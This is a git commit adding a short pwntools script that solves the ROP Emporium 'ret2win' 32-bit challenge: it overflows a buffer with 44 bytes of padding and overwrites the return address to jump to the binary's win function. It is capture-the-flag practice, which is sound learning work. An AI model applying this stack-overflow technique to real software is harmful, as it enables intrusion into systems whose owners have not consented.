f7f8d0cf3edeede47ab6dfc9d7d3523eae1e1c49
GIH5 <128325272+GIH5@users.noreply.github.com>
2023-06-26 14:53:19 -0400

    Update ret2win32.py

--- Other/ret2win32.py
+++ Other/ret2win32.py
@@ -1,1 +1,12 @@
+#link: https://ropemporium.com/challenge/ret2win.html
+from pwn import *
 
+bin = process('./ret2win32')
+
+fill = b"A"*44
+addr = b"\x2c\x86\x04\x08"
+combine = fill + addr
+
+bin.send(combine)
+bin.interactive()
+print(bin.recvline())
